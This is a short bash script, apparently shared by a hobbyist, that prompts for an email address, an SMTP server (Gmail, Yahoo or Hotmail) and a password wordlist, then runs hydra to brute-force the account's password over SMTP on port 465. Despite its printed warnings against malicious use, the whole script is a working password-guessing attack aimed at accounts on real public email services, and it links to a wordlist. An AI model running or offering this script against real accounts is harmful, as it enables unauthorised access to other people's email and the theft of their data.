#! /bin/bash
echo -e "\e[33mPrerequisites: hydra-gtk \e[0m"
echo -e "Writed By:  \e[95mPurpl3Dev \e[0m"
echo -e "\e[91m NOTE: Make sure you have wordlists! \e[0m"
echo -e "If you dont have one check our recommended: \e[38;5;82mhttps://bit.ly/3JyARYc]"
echo -e "\e[97;101mDo not use this script with malicious intentions, remember that nothing on the web is completely untraceable. \e[0m"
echo -e "\e[0mLets start:"
echo -e "Choose a SMTP service: \e[93mGmail \e[0m = smtp.gmail.com / \e[32mYahoo \e[0m = smtp.mail.yahoo.com / \e[96mHotmail \e[0m = smtp.live.com /":
read -r smtp
echo Enter Email Address:
read -r email
echo "Provide Directory of Wordlist for Passwords:"
read -r wordlist
echo Do not use this script with malicious intentions, remember that nothing on the web is completely untraceable.
hydra -S -l $email -P $wordlist -e ns -V -s 465 $smtp smtp

